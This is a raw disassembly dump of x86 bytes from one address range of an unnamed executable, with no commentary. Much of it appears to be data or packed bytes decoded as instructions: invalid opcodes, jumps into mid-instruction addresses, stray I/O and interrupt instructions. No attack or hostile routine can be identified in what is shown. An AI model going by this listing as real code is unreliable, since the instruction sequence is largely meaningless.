  40284c:	imul   ecx,DWORD PTR [ebp+0x20],0x6d0d4d64
  402853:	imul   esp,DWORD PTR cs:[ecx+0x6f],0x44675772
  40285b:	jae    0x40289e
  40285d:	je     0x4028c4
  40285f:	das    
  402860:	fs jae 0x402883
  402863:	and    BYTE PTR [edx+0x65],dh
  402866:	ins    DWORD PTR es:[edi],dx
  402867:	bound  esi,QWORD PTR [ecx+0x65]
  40286a:	outs   dx,BYTE PTR ds:[esi]
  40286b:	jb     0x4028cf
  40286d:	and    BYTE PTR [ebx+0x20],dh
  402870:	jae    0x4028d7
  402872:	and    BYTE PTR [edx+0x79],ah
  402875:	ins    DWORD PTR es:[edi],dx
  402876:	and    BYTE PTR [ebp+0x69],ch
  402879:	inc    ecx
  40287a:	cs push edi
  40287c:	and    BYTE PTR [edx],ah
  40287e:	outs   dx,DWORD PTR ds:[esi]
  40287f:	outs   dx,BYTE PTR ds:[esi]
  402880:	cs jae 0x4028e4
  402883:	gs gs push edi
  402886:	arpl   WORD PTR [edx+0x67],si
  402889:	and    BYTE PTR [edx+0x2c],dh
  40288c:	imul   esi,DWORD PTR [ebp+0x53],0xff705365
  402893:	call   FWORD PTR [ecx]
  402895:	fcomp  QWORD PTR [ecx]
  402897:	inc    DWORD PTR [eax]
  402899:	sub    cl,BYTE PTR [ebx+0x25c1976]
  40289f:	add    al,0x48
  4028a1:	ja     0x4028f6
  4028a3:	arpl   di,cx
  4028a5:	jbe    0x4028d6
  4028a7:	icebp  
  4028a8:	sbb    BYTE PTR [ecx+0x1c5cb58e],bl
  4028ae:	enter  0xf9f6,0x0
  4028b2:	add    BYTE PTR [eax],al
  4028b4:	cmp    al,0x78
  4028b6:	cmp    ah,dh
  4028b8:	mov    ebp,0xddb531d8
  4028bd:	pop    ecx
  4028be:	and    DWORD PTR [ebp+0x29c4636c],esp
  4028c4:	push   ecx
  4028c5:	inc    ebx
  4028c6:	push   ecx
  4028c7:	cmp    DWORD PTR [eax+0x7b59fd32],0xffffff97
  4028ce:	sbb    ecx,edx
  4028d0:	mov    es,WORD PTR [eax]
  4028d2:	add    bh,ch
  4028d4:	int3   
  4028d5:	arpl   WORD PTR [eax],ax
  4028d7:	add    BYTE PTR [eax],al
  4028d9:	(bad)  
  4028da:	(bad)  
  4028db:	(bad)  
  4028dc:	(bad)  
  4028dd:	(bad)  
  4028de:	(bad)  
  4028df:	(bad)  
  4028e0:	(bad)  
  4028e1:	dec    DWORD PTR [ecx]
  4028e3:	jnp    0x40290f
  4028e5:	rol    al,0xc0
  4028e8:	rol    al,0xc0
  4028eb:	rol    al,0xc0
  4028ee:	add    BYTE PTR [eax],al
  4028f0:	mov    ?,WORD PTR [esi+0x1c9d1041]
  4028f6:	mov    al,0xfb
  4028f8:	jmp    0x4028e5
  4028fa:	jo     0x4028a9
  4028fc:	pop    ebx
  4028fd:	int    0xfe
  4028ff:	add    DWORD PTR [edx],0x1a
  402902:	leave  
  402903:	jl     0x4028a9
  402905:	mov    ds:0x6dde,eax
  40290a:	dec    edi
  40290b:	ins    DWORD PTR es:[edi],dx
  40290c:	add    BYTE PTR [eax],al
  40290e:	jge    0x402895
  402910:	add    BYTE PTR [eax],al
  402912:	sbb    ah,BYTE PTR [ebx+eax*1+0x2d]
  402916:	mul    dh
  402918:	xor    al,0x61
  40291a:	jmp    0x29d8dcda
  40291f:	dec    edx
  402920:	cld    
  402921:	loopne 0x402921
  402923:	mov    dl,0x7e
  402925:	ds sbb ah,bl
  402928:	sub    al,0x1a
  40292a:	add    BYTE PTR [eax],al
  40292c:	cli    
  40292d:	fidivr WORD PTR [ebx+0xf]
  402933:	mov    dl,0x98
  402935:	loopne 0x402907
  402937:	jno    0x402967
  402939:	and    ebx,edi
  40293b:	(bad)  
  40293c:	outs   dx,BYTE PTR ds:[esi]
  40293d:	or     BYTE PTR [ebx-0x41a6cc47],al
  402943:	fstp   TBYTE PTR [ebx-0x36]
  402946:	mov    dh,0x2d
  402948:	inc    ebx
  402949:	or     esi,DWORD PTR [edx+ebp*4]
  40294c:	gs iret 
  40294e:	mov    DWORD PTR [ebx],0x50491fb4
  402954:	jg     0x4029b2
  402956:	add    BYTE PTR [eax],al
  402958:	or     al,0xdd
  40295a:	add    BYTE PTR [eax],al
  40295c:	add    BYTE PTR [ecx-0x76767677],cl
  402962:	mov    DWORD PTR [ecx+0x65ce8989],ecx
  402968:	inc    esp
	...
  402971:	add    BYTE PTR [eax],al
  402973:	add    BYTE PTR [ecx],ah
  402975:	or     DWORD PTR [esi+ecx*4-0x40],ecx
  402979:	mov    eax,0xbcdda1f0
  40297e:	(bad)  
  40297f:	int    0xe5
  402981:	fcomi  st,st(6)
  402983:	ds or  eax,0x62e4a937
  402989:	outs   dx,BYTE PTR ds:[esi]
  40298a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40298b:	sbb    BYTE PTR [eax],al
  40298d:	add    dh,ch
  40298f:	out    dx,eax
  402990:	or     eax,0x6798a01c
  402995:	pop    ebx
  402996:	test   BYTE PTR [ecx+0x410b297e],ah
  40299c:	loope  0x4029fe
  40299e:	and    ebp,ebx
  4029a0:	fisttp WORD PTR [ecx-0x17]
  4029a3:	mov    bl,0x8a
  4029a5:	inc    ebx
  4029a6:	xor    BYTE PTR [esi+0x8e8cb4],ch
  4029ac:	add    BYTE PTR [eax+0xb869],ah
  4029b2:	push   es
  4029b3:	dec    ebp
  4029b4:	lea    eax,[eax]
  4029b6:	add    BYTE PTR [ebp-0x496f0eeb],dl
  4029bc:	sbb    esi,ebx
  4029be:	jge    0x4029e9
  4029c0:	cs sahf 
  4029c2:	fs jno 0x4029f1
  4029c5:	xor    DWORD PTR [ebp+0x5a],ebx
  4029c8:	sbb    BYTE PTR [ebp+0x19],0xec
  4029cc:	cmp    DWORD PTR [eax+0xfb],eax
  4029d2:	jae    0x402959
  4029d4:	add    BYTE PTR [eax],al
  4029d6:	stos   BYTE PTR es:[edi],al
  4029d7:	and    al,0x0
	...
  4029e1:	add    BYTE PTR [eax],al
  4029e3:	add    BYTE PTR [ebx-0x22],cl
  4029e6:	jne    0x402992
  4029e8:	test   BYTE PTR [ebx],cl
  4029ea:	xchg   edx,eax
  4029eb:	ins    DWORD PTR es:[edi],dx
  4029ec:	ret    0x15a6
  4029ef:	js     0x402a01
  4029f1:	ret    
  4029f2:	mov    bh,0xae
  4029f4:	mov    bh,0xbc
  4029f6:	dec    ebp
  4029f7:	sahf   
  4029f8:	cmp    BYTE PTR [edi-0x61],dh
  4029fb:	popa   
  4029fc:	mov    ecx,DWORD PTR [ebx-0x74747475]
  402a02:	mov    ecx,DWORD PTR [ebx+0x4ccccc8b]
  402a08:	inc    edx
  402a09:	arpl   WORD PTR [ecx],bp
  402a0b:	int3   
  402a0c:	int3   
  402a0d:	sbb    al,0x4c
  402a0f:	inc    cx
  402a11:	sub    al,BYTE PTR [eax+0x40]
  402a14:	and    al,0x6
  402a16:	dec    esp
  402a17:	pop    eax
  402a18:	mov    ss,WORD PTR gs:[edi]
  402a1b:	xchg   ecx,eax
  402a1c:	dec    esp
  402a1d:	jmp    0x13152713
  402a22:	xor    al,bl
  402a24:	idiv   eax
  402a26:	addr16 inc ecx
  402a28:	sar    BYTE PTR [ecx+0x47aa0a8e],1
  402a2e:	fcom   QWORD PTR [esi-0x3c513334]
  402a34:	int3   
  402a35:	int3   
  402a36:	push   ebx
  402a37:	dec    ecx
  402a38:	push   ds
  402a39:	int3   
  402a3a:	add    bh,ah
  402a3c:	dec    edx
  402a3d:	(bad)  
  402a3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a3f:	cmp    BYTE PTR [ebp+ebp*2+0x5d],ch
  402a43:	lea    esp,[edx+0x36]
  402a46:	add    eax,0x79368c62
  402a4b:	fld    st(0)
  402a4d:	retf   
  402a4e:	call   0xc34385d5
  402a53:	add    BYTE PTR [eax],al
  402a55:	add    BYTE PTR [edx-0x60de049b],ah
  402a5b:	clc    
  402a5c:	lock xor DWORD PTR [edi-0x16571964],0xffffff8a
  402a64:	out    dx,al
  402a65:	jne    0x402a65
  402a67:	cmp    DWORD PTR [ebx-0x3c],edx
  402a6a:	fcmovne st,st(2)
  402a6c:	fnsave [ecx-0x6de98806]
  402a72:	xor    DWORD PTR [eax],eax
  402a74:	add    ah,cl
  402a76:	sti    
  402a77:	lods   al,BYTE PTR ds:[esi]
	...
  402a84:	lock mov ds:0x89898931,al
  402a8a:	mov    DWORD PTR [ecx-0x76767677],ecx
  402a90:	int3   
  402a91:	int3   
  402a92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a93:	push   ss
  402a94:	data16 das 
  402a96:	(bad)  
  402a97:	std    
  402a98:	push   DWORD PTR [edx]
  402a9a:	sub    cl,dl
  402a9c:	mov    cl,0xbf
  402a9e:	mov    ah,0xf6
  402aa0:	sub    BYTE PTR [ebx-0x5111359a],0x4e
  402aa7:	sub    eax,0xcccc4926
  402aac:	(bad)  
  402aad:	push   edi
  402aae:	int3   
  402aaf:	int3   
  402ab0:	test   BYTE PTR [ebx+0x465bcccc],0x26
  402ab7:	add    DWORD PTR [edx+0x33],ebx
  402aba:	cwde   
  402abb:	imul   edx
  402abd:	cmp    al,0xc0
  402abf:	pop    edi
  402ac0:	cmp    BYTE PTR [ebx-0x71],bh
  402ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ac4:	in     al,0x35
  402ac6:	sub    eax,0xef7bf2e0
  402acb:	xor    al,0xcc
  402acd:	add    BYTE PTR [esi],cl
  402acf:	nop
  402ad0:	das    
  402ad1:	test   al,0x0
  402ad3:	add    BYTE PTR [eax],al
  402ad5:	std    
  402ad6:	jbe    0x402b14
  402ad8:	sub    DWORD PTR [eax+0x4f],ebp
  402adb:	int    0x42
  402add:	mov    gs,WORD PTR [ebx]
  402adf:	or     al,BYTE PTR [esi]
  402ae1:	push   0xf53e772a
  402ae6:	adc    eax,0x333b7be3
  402aeb:	ret    0xe6fa
  402aee:	arpl   WORD PTR [eax+ebx*1-0x78],si
  402af2:	cmp    BYTE PTR [edx+0x42],dl
  402af5:	mov    bh,0xdb
  402af7:	pushf  
  402af8:	add    BYTE PTR [eax],al
  402afa:	inc    esp
  402afb:	pop    DWORD PTR [eax]
	...
  402b05:	add    BYTE PTR [eax],al
  402b07:	add    BYTE PTR [eax],dl
  402b09:	pop    es
  402b0a:	push   cs
  402b0b:	je     0x402b81
  402b0d:	je     0x402b83
  402b0f:	je     0x402b85
  402b11:	je     0x402b87
  402b13:	je     0x402b21
  402b15:	or     al,0xa2
  402b17:	jp     0x402b27
  402b19:	mov    eax,ds:0xbd6c0409
  402b1e:	mov    ds:0x40967373,al
  402b23:	lods   eax,DWORD PTR ds:[esi]
  402b24:	cmp    BYTE PTR [eax-0x7d],0x93
  402b28:	jmp    esi
  402b2a:	xchg   BYTE PTR ds:0xc0c04a5,al
  402b30:	dec    ebx
  402b31:	test   BYTE PTR [edi+0x2],dh
  402b34:	out    dx,al
  402b35:	or     edx,eax
  402b37:	fimul  DWORD PTR [ecx]
  402b39:	adc    BYTE PTR [edi+0x78b3833],0x71
  402b40:	cmp    ah,bh
  402b42:	mov    edi,0xd4e51257
  402b47:	imul   DWORD PTR ds:0xd5cb8a9a
  402b4d:	or     al,0xc
  402b4f:	out    dx,eax
  402b50:	test   DWORD PTR [esp+ecx*1],ebx
  402b53:	or     al,0xe7
  402b55:	pop    es
  402b56:	int    0xc
  402b58:	add    bh,bl
  402b5a:	mov    cl,0x94
  402b5c:	add    bl,ah
  402b5e:	shr    BYTE PTR [eax-0x2477e3ed],0x1b
  402b65:	mov    cl,0xaf
  402b67:	addr16 out dx,eax
  402b69:	jns    0x402bab
  402b6b:	dec    esi
  402b6c:	shl    BYTE PTR [ebp-0x21],0x53
  402b70:	push   0x0
  402b72:	add    BYTE PTR [eax],al
  402b74:	retf   
  402b75:	rol    DWORD PTR [eax],1
  402b77:	add    BYTE PTR [edi+0x46],al
  402b7a:	add    BYTE PTR [eax],al
  402b7c:	add    BYTE PTR [ebp-0x72727273],cl
  402b82:	lea    ecx,[ebp+0x1ac8d8d]
  402b88:	xchg   ebx,eax
  402b89:	sbb    eax,0xb53e5f52
  402b8e:	mov    al,BYTE PTR [edi+0x1b85eff6]
  402b94:	rsqrtps xmm3,XMMWORD PTR [ecx+0x925567f]
  402b9b:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  402b9d:	loopne 0x402b2a
  402b9f:	mov    ecx,DWORD PTR [ebx-0x74747475]
  402ba5:	mov    ecx,DWORD PTR [ebx-0x399d7475]
  402bab:	retf   
  402bac:	mov    cl,0x8b
  402bae:	mov    ebp,DWORD PTR [eax-0x4dcf0f6d]
  402bb4:	fcomip st,st(1)
  402bb6:	scas   al,BYTE PTR es:[edi]
  402bb7:	jae    0x402b64
  402bb9:	sub    bl,BYTE PTR [esi-0x12bd1e1c]
  402bbf:	xor    DWORD PTR [edi-0x1a],0x3c347f88
  402bc6:	xor    eax,0x6f0b2c4a
  402bcb:	xor    DWORD PTR [edi-0x2076f892],ecx
  402bd1:	push   ebx
  402bd2:	mov    ecx,DWORD PTR [ebx-0x747412b1]
  402bd8:	rcl    DWORD PTR [esi+0x5b8d8b92],0xd5
  402bdf:	int    0x7a
  402be1:	fnstcw WORD PTR ds:0x51595655
  402be7:	jl     0x402bc8
  402be9:	jb     0x402c66
  402beb:	das    
  402bec:	mov    eax,DWORD PTR [eax]
  402bee:	add    BYTE PTR [edi+0x4b],ah
  402bf1:	cmp    eax,0x8d08a876
  402bf6:	lea    ecx,[ebp+0x6ace1e38]
  402bfc:	xlat   BYTE PTR ds:[ebx]
  402bfd:	cld    
  402bfe:	ins    DWORD PTR es:[edi],dx
  402bff:	nop
  402c00:	xchg   ebp,eax
  402c01:	stos   BYTE PTR es:[edi],al
  402c02:	or     edx,esp
  402c04:	cwde   
  402c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c06:	pop    ss
  402c07:	xor    BYTE PTR ds:0x2d9ef497,0x3f
  402c0e:	mov    ch,0x29
  402c10:	xor    BYTE PTR [ecx],0x54
  402c13:	arpl   WORD PTR [ecx],bp
  402c15:	lea    ecx,[ebp-0x720190fc]
  402c1b:	lea    ecx,[ebp+0x0]
  402c21:	add    BYTE PTR [eax],al
  402c23:	add    BYTE PTR [eax],al
  402c25:	add    BYTE PTR [esi-0x2a4],bh
  402c2b:	and    BYTE PTR [ebp+0x65],ah
  402c2e:	outs   dx,BYTE PTR ds:[esi]
  402c2f:	jae    0x402c3e
  402c31:	dec    ebp
  402c32:	and    BYTE PTR [ebp+0x70],cl
  402c35:	jbe    0x402c75
  402c37:	imul   esp,DWORD PTR [edx],0x65
  402c3a:	and    BYTE PTR ds:0x69706354,bh
  402c40:	or     eax,0x2e6f6323
  402c45:	cs jae 0x402cba
  402c48:	outs   dx,BYTE PTR ds:[esi]
  402c49:	gs jb  0x402cae
  402c4c:	arpl   WORD PTR [ecx+0x3e],bp
  402c4f:	outs   dx,BYTE PTR ds:[esi]
  402c50:	and    BYTE PTR [esi+ebp*1],ch
  402c53:	ds ds ins BYTE PTR es:[edi],dx
  402c56:	gs outs dx,BYTE PTR cs:[esi]
  402c59:	or     cl,BYTE PTR ds:0x6570613e
  402c5f:	jo     0x402cca
  402c61:	jb     0x402cc6
  402c63:	popa   
  402c64:	cmp    al,0x2e
  402c66:	ins    DWORD PTR es:[edi],dx
  402c67:	sub    BYTE PTR [esi-0x1],ch
  402c6a:	(bad)  
  402c6b:	(bad)  
  402c6c:	(bad)  
  402c6d:	(bad)  
  402c6e:	(bad)  
  402c6f:	(bad)  
  402c70:	(bad)  
  402c71:	call   DWORD PTR [edx+0x76]
  402c74:	sahf   
  402c75:	and    al,0xc7
  402c77:	enter  0xdec9,0xd4
  402c7b:	push   esi
  402c7c:	push   ebp
  402c7d:	arpl   sp,bx
  402c7f:	mul    BYTE PTR [eax+0x9870ee4]
  402c85:	jbe    0x402cf4
  402c87:	adc    eax,0xffffce27
  402c8c:	mov    ebx,0x93ffffb0
  402c91:	loop   0x402c92
  402c93:	inc    ebp
  402c95:	lock into 
  402c97:	(bad)  
  402c98:	mov    ecx,0xd3cc519a
  402c9d:	pop    edi
  402c9e:	lahf   
  402c9f:	in     eax,dx
  402ca0:	sub    BYTE PTR [edx+0x78],ah
  402ca3:	cmc    
  402ca4:	div    BYTE PTR [eax+0x21]
  402ca7:	nop    DWORD PTR [ebx]
  402caa:	mov    dh,0x7e
  402cac:	push   DWORD PTR [ebp+eax*4-0x52]
  402cb0:	mov    ecx,esp
  402cb2:	je     0x402d28
  402cb4:	je     0x402c8b
  402cb6:	mov    DWORD PTR [eax+0xa],esp
  402cb9:	jo     0x402d20
  402cbb:	xchg   BYTE PTR ds:0x29c6d32d,al
  402cc1:	repnz push ss
  402cc3:	jb     0x402c69
  402cc5:	bound  edx,QWORD PTR [eax-0x411809cc]
  402ccb:	dec    ecx
  402ccc:	mov    ebp,0xf4ede015
  402cd1:	cmp    al,0x6a
  402cd3:	int3   
  402cd4:	sahf   
  402cd5:	outs   dx,BYTE PTR ds:[esi]
  402cd6:	outs   dx,DWORD PTR ds:[esi]
  402cd7:	inc    edx
  402cd8:	je     0x402d4e
  402cda:	jmp    0x74b4a167
	...
  402ce7:	add    BYTE PTR [edi],dl
  402ce9:	into   
  402cea:	mov    esp,0x45454545
  402cef:	inc    ebp
  402cf0:	inc    ebp
  402cf1:	inc    ebp
  402cf2:	inc    ebp
  402cf3:	inc    ebp
  402cf4:	or     al,0xc
  402cf6:	sub    eax,0xa7219f12
  402cfb:	jle    0x402d0a
  402cfd:	sbb    BYTE PTR [ebx-0x54],bh
  402d00:	add    ecx,DWORD PTR [esi-0x9]
  402d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d04:	imul   esi,esp,0xd9ce24ad
  402d0a:	in     al,0xe6
  402d0c:	xor    al,0xb5
  402d0e:	or     al,0xc
  402d10:	into   
  402d11:	(bad)  
  402d12:	pop    eax
  402d13:	jmp    0xabbef6cd
  402d18:	fld    TBYTE PTR [esi+0x73]
  402d1b:	dec    ebx
  402d1c:	or     DWORD PTR [edx-0x35a97813],ebx
  402d22:	ja     0x402cd1
  402d24:	es adc al,0x99
  402d27:	imul   BYTE PTR [edx+ebp*4-0x60]
  402d2b:	xor    BYTE PTR [eax+0x1d3d0c0c],dh
  402d31:	mov    edx,0x8aa0c0c
  402d36:	jns    0x402d44
  402d38:	(bad)  
  402d39:	cli    
  402d3a:	adc    eax,0xef2fcfa3
  402d3f:	xchg   esp,eax
  402d40:	and    ebx,DWORD PTR [eax]
  402d42:	aam    0xea
  402d44:	rcr    BYTE PTR [ecx+0x6a],cl
  402d47:	add    ebp,esp
  402d49:	lods   eax,DWORD PTR ds:[esi]
  402d4a:	inc    esi
  402d4b:	push   ecx
  402d4c:	out    dx,eax
  402d4d:	ret    0x465f
  402d50:	ret    0xffff
  402d53:	jmp    FWORD PTR [esi-0x7a0000c8]
  402d59:	idiv   edi
  402d5b:	(bad)  
  402d5c:	inc    DWORD PTR [eax]
	...
  402d66:	xchg   esi,eax
  402d67:	dec    esp
  402d68:	jbe    0x402d31
  402d6a:	test   eax,0xea42684e
  402d6f:	hlt    
  402d70:	gs mov bh,0x6e
  402d73:	jg     0x402de3
  402d75:	rol    di,0x8d
  402d79:	xchg   esp,eax
  402d7a:	icebp  
  402d7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d7c:	cmp    DWORD PTR [edi],ecx
  402d7e:	mov    ecx,DWORD PTR [ebx-0x74747475]
  402d84:	mov    ecx,DWORD PTR [ebx-0x1747475]
  402d8a:	jmp    0xd18f:0x8b8be36c
  402d91:	jle    0x402e01
  402d93:	jge    0x402dcd
  402d95:	sbb    al,0xb
  402d97:	punpcklbw mm4,DWORD PTR [edx+0x33c4008c]
  402d9e:	push   eax
  402d9f:	popa   
  402da0:	xchg   esi,eax
  402da1:	add    eax,0x938a28b2
  402da6:	cmp    al,0x3c
  402da8:	fsubr  st,st(6)
  402daa:	aas    
  402dab:	cmp    al,0x48
  402dad:	sub    cl,BYTE PTR [esi+0x35]
  402db0:	inc    ebx
  402db1:	or     al,0x8b
  402db3:	mov    edi,DWORD PTR [ebx]
  402db5:	call   0x8ca8b945
  402dba:	in     eax,dx
  402dbb:	mov    eax,DWORD PTR [ebx-0x14cd7247]
  402dc1:	xlat   BYTE PTR ds:[ebx]
  402dc2:	out    0x4a,eax
  402dc4:	aam    0xf7
  402dc6:	adc    BYTE PTR [edx+esi*4],bh
  402dc9:	push   esi
  402dca:	push   ebx
  402dcb:	iret   
  402dcc:	pop    esi
  402dcd:	xchg   ecx,eax
  402dce:	sbb    BYTE PTR es:[edi-0x79],bh
  402dd2:	rcl    edx,0xb5
  402dd5:	add    DWORD PTR [ebx-0x53476a7d],0xfffffffb
  402ddc:	adc    al,0xd5
  402dde:	push   ebx
  402ddf:	mov    edi,DWORD PTR [esi]
  402de1:	imul   ebp,DWORD PTR [ebp-0x680276f],0x50076730
  402deb:	je     0x402d86
  402ded:	(bad)  
  402dee:	pop    eax
  402def:	repz stc 
  402df1:	or     al,BYTE PTR [edi-0x7c7cc1ef]
  402df7:	cwde   
  402df8:	mov    edi,0x83838337
  402dfd:	mov    ecx,DWORD PTR [ebx-0x74747475]
  402e03:	mov    ecx,DWORD PTR [ebx+0x736c5d8b]
  402e09:	(bad)  
  402e0a:	(bad)  
  402e0b:	(bad)  
  402e0c:	(bad)  
  402e0d:	(bad)  
  402e0e:	(bad)  
  402e0f:	(bad)  
  402e10:	(bad)  
  402e11:	dec    DWORD PTR [edi]
  402e13:	(bad)  
  402e15:	aam    0x28
  402e17:	and    cl,ah
  402e19:	fcmovu st,st(2)
  402e1b:	push   0xffffffc8
  402e1d:	mov    ds,edi
  402e1f:	in     eax,0x4
  402e21:	lea    esp,[ebx]
  402e23:	sbb    cl,ch
  402e25:	ins    DWORD PTR es:[edi],dx
  402e26:	jns    0x402e56
  402e28:	inc    ecx
  402e29:	gs or  eax,0x3a722e65
  402e2f:	push   edi
  402e30:	push   eax
  402e31:	and    BYTE PTR [eax+0x4d],dh
  402e34:	gs gs cmp eax,0x3e2e2e3e
  402e3b:	and    BYTE PTR [eax+ebp*1+0x3d],ah
  402e3f:	and    BYTE PTR [ebp+0x65],ah
  402e42:	jb     0x402e72
  402e44:	and    BYTE PTR [ebx+0x20],dh
  402e47:	imul   esi,DWORD PTR [esi+0x65],0x3c707220
  402e4e:	jne    0x402e70
  402e50:	inc    ebx
  402e51:	jae    0x402ec0
  402e53:	das    
  402e54:	and    BYTE PTR [ebp+0x6d],ah
  402e57:	cmp    al,0x72
  402e59:	popa   
  402e5a:	outs   dx,DWORD PTR ds:[esi]
  402e5b:	imul   esi,DWORD PTR [edx+0x61],0x6173652e
  402e62:	arpl   WORD PTR [ecx+0x20],bp
  402e65:	ins    BYTE PTR es:[edi],dx
  402e66:	gs je  0x402edc
  402e69:	or     ah,BYTE PTR cs:[esi+0x72]
  402e6d:	inc    ebx
  402e6e:	or     eax,0x6f220a65
  402e73:	addr16 jb 0x402e80
  402e76:	js     0x402ee8
  402e78:	outs   dx,BYTE PTR gs:[esi]
  402e7a:	inc    ecx
  402e7b:	gs je  0x402ee0
  402e7e:	arpl   WORD PTR gs:[ebp+0x20],bp
  402e82:	cs or  eax,0x61206944
  402e88:	and    BYTE PTR [edx],cl
  402e8a:	jbe    0x402efa
  402e8c:	ds je  0x402eff
  402e8f:	imul   esi,DWORD PTR gs:[eax+0x76],0x6e6d6e65
  402e97:	gs ins DWORD PTR es:[edi],dx
  402e99:	jb     0x402f00
  402e9b:	outs   dx,DWORD PTR ds:[esi]
  402e9c:	and    BYTE PTR [eax],ah
  402e9e:	jb     0x402f0e
  402ea0:	jb     0x402f15
  402ea2:	imul   edi,DWORD PTR [esi],0x36737272
  402ea8:	sbb    BYTE PTR [eax],cl
  402eaa:	inc    ebx
  402eab:	xor    esi,esp
  402ead:	mov    edx,0xa6a00f0f
  402eb2:	(bad)  
  402eb3:	pmulhw mm4,QWORD PTR [esi+0xf]
  402eb7:	nop/reserved BYTE PTR [esi]
  402eba:	test   al,0x6d
  402ebc:	push   edx
  402ebd:	and    BYTE PTR [ecx+eax*4-0x4b],bl
  402ec1:	jnp    0x402ebc
  402ec3:	xor    al,0x9e
  402ec5:	push   eax
  402ec6:	xchg   edx,eax
  402ec7:	jp     0x402f1f
  402ec9:	xor    BYTE PTR [esi+edx*4],bl
  402ecc:	cmp    al,0x48
  402ece:	jp     0x402e5a
  402ed0:	jnp    0x57f33981
  402ed6:	mov    ecx,DWORD PTR [ebx-0x705f9975]
  402edc:	pop    edi
  402edd:	(bad)  
  402ede:	jg     0x402e9d
  402ee0:	in     al,dx
  402ee1:	or     DWORD PTR [ebx+ebp*4],eax
  402ee4:	xchg   esp,eax
  402ee5:	and    BYTE PTR [esi-0xac47f65],bl
  402eeb:	outs   dx,BYTE PTR ds:[esi]
  402eec:	mov    edx,0x1dfae52d
  402ef1:	xor    ebx,DWORD PTR [edi+eiz*4]
  402ef4:	prefetch BYTE PTR [esi]
  402ef7:	loopne 0x402ee0
  402ef9:	add    ebx,DWORD PTR [esi-0x5a]
  402efc:	mov    ecx,DWORD PTR [ebx-0x74743769]
  402f02:	mov    eax,DWORD PTR [esp+eax*1]
  402f05:	add    al,0x4
  402f07:	add    al,0x4
  402f09:	add    al,0x4
  402f0b:	add    al,0xef
  402f0d:	jo     0x402f11
	...
  402f17:	add    al,al
  402f19:	shr    BYTE PTR [ebx-0x18efd1e7],0x95
  402f20:	jl     0x402ec7
  402f22:	cld    
  402f23:	inc    ecx
  402f24:	push   esi
  402f25:	popa   
  402f26:	mov    ss,WORD PTR [ecx-0x66792589]
  402f2c:	outs   dx,BYTE PTR ds:[esi]
  402f2d:	(bad)  [edx+ebp*2+0x55]
  402f31:	cwde   
  402f32:	rol    al,0x3a
  402f35:	inc    esi
  402f36:	cmp    al,0xc7
  402f38:	mov    cl,0x10
  402f3a:	xchg   DWORD PTR [esi],ecx
  402f3c:	sbb    DWORD PTR [esi],esp
  402f3e:	pop    ss
  402f3f:	cmp    ecx,DWORD PTR [edx]
  402f41:	das    
  402f42:	dec    ecx
  402f43:	fs xor al,0x29
  402f46:	scas   al,BYTE PTR es:[edi]
  402f47:	or     al,0xa5
  402f49:	dec    di
  402f4b:	jmp    0x402faf
  402f4d:	mov    ds:0xc0bd93c1,eax
  402f52:	shl    BYTE PTR [esp+edi*8],0xc6
  402f56:	rol    al,0xe8
  402f59:	sbb    eax,0xfe8dc075
  402f5e:	int3   
  402f5f:	int    0xf6
  402f61:	(bad)  
  402f62:	nop
  402f63:	adc    al,0xe3
  402f65:	mov    ebp,0xcb81bca2
  402f6a:	out    0xff,eax
  402f6c:	sti    
  402f6d:	push   ss
  402f6e:	fs imul esp,edi,0x4f71f22b
  402f75:	lea    ecx,[ebp-0x72946473]
  402f7b:	lea    esp,[eax]
  402f7d:	jge    0x402f0c
  402f7f:	lea    ecx,[ebp+0x75757575]
  402f85:	jne    0x402ffc
  402f87:	jne    0x402ffe
  402f89:	jne    0x402f40
  402f8b:	cmp    DWORD PTR [ebp+0xf],ebx
  402f8e:	jmp    0xdc784352
  402f93:	and    ecx,ecx
  402f95:	adc    al,0xe3
  402f97:	fiadd  WORD PTR [ecx+0x7848078d]
  402f9d:	sbb    al,0xb0
  402f9f:	cld    
  402fa0:	xor    al,0x8c
  402fa2:	(bad)  
  402fa3:	(bad)  
  402fa4:	(bad)  
  402fa5:	(bad)  
  402fa6:	(bad)  
  402fa7:	(bad)  
  402fa8:	(bad)  
  402fa9:	(bad)  
  402faa:	inc    DWORD PTR [eax]
  402fac:	add    ch,dh
  402fae:	cmp    bl,bl
  402fb0:	cmc    
  402fb1:	add    BYTE PTR [eax],al
  402fb3:	cld    
  402fb4:	mov    dh,0x1d
  402fb6:	sbb    eax,0xc65d7df9
  402fbb:	addr16 inc ebp
  402fbd:	sub    esp,eax
  402fbf:	ins    BYTE PTR es:[edi],dx
  402fc0:	int3   
  402fc1:	cwde   
  402fc2:	aad    0xe6
  402fc4:	sub    edi,esp
  402fc6:	push   0x1eb4f779
  402fcb:	jg     0x402f71
  402fcd:	push   ds
  402fce:	push   cs
  402fcf:	mov    eax,0xaede5afa
  402fd4:	push   edi
  402fd5:	jae    0x402fd7
  402fd7:	add    ch,al
  402fd9:	inc    DWORD PTR [eax]
  402fdb:	add    BYTE PTR [edx+0x8],bh
  402fde:	ja     0x402fe0
  402fe0:	inc    ebp
  402fe1:	pusha  
  402fe2:	jmp    DWORD PTR [ebx+ebx*2+0x43]
  402fe6:	(bad)  
  402fe7:	jecxz  0x402fef
  402fe9:	js     0x403039
  402feb:	xchg   esp,eax
  402fec:	xor    al,0xaa
  402fee:	push   esi
  402fef:	xchg   ebp,eax
  402ff0:	push   ebp
  402ff1:	dec    edi
  402ff2:	xchg   edx,eax
  402ff3:	(bad)  
  402ff4:	in     al,dx
  402ff5:	outs   dx,DWORD PTR ds:[esi]
  402ff6:	sbb    dl,BYTE PTR [ebp+0x45454516]
  402ffc:	and    eax,0x958d31f8
  403001:	sub    BYTE PTR [esi-0x4a],bl
  403004:	xchg   edi,eax
  403005:	js     0x403073
  403007:	and    BYTE PTR [ebp-0x1e7db975],cl
  40300d:	sbb    esi,ecx
  40300f:	dec    ebp
  403010:	mov    edi,esp
  403012:	add    al,bl
  403014:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403015:	(bad)  
  403017:	lds    edx,FWORD PTR [edx]
  403019:	inc    ebp
  40301a:	inc    ebp
